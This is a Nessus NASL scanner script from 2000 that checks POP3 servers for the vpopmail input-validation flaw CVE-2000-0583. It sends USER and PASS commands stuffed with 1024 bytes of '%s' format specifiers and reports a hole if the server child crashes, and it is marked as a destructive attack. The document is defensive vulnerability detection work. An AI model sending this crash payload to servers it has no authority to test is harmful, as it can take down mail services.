#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10463);
 script_bugtraq_id(1418);
 script_version ("$Revision: 1.9 $");
 script_cve_id("CVE-2000-0583");
 name["english"] = "vpopmail input validation bug";
 name["francais"] = "bug de validation d'entrée dans vpopmail";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote vpopmail server is vulnerable to
an input validation bug which may allow any
user to execute arbitrary code on this system
by providing a specially crafted username.

Solution : upgrade to vpopmail 4.8
Risk factor : High";


 desc["francais"] = "
Le serveur vpopmail distant est vulnérable à
un problème de validation de données entrées
par l'utilisateur, qui permet à n'importe qui
d'executer du code arbitraire en donnant
un nom d'utilisateur spécialement mal formé.

Solution : mettez vpopmail à jour en version 4.8
Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Logs into the pop3 server with a crafter username";
 summary["francais"] = "Essaye de se logguer dans le serveur pop avec un nom d'utilisateur spécial";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "qpopper.nasl");
 script_exclude_keys("pop3/false_pop3");
 script_require_ports("Services/pop3", 110);
 exit(0);
}

#
# The script code starts here
#

fake = get_kb_item("pop3/false_pop3");
if(fake)exit(0);
port = get_kb_item("Services/pop3");
if(!port)port = 110;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  d = recv_line(socket:soc, length:1024);
  if(!d){close(soc);exit(0);}
  
  c = string("USER ", crap(length:1024, data:"%s"), "\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024);
  c = string("PASS ", crap(length:1024, data:"%s"), "\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024);
  if("aack, child crashed" >< d)security_hole(port);
  close(soc);
  }
}
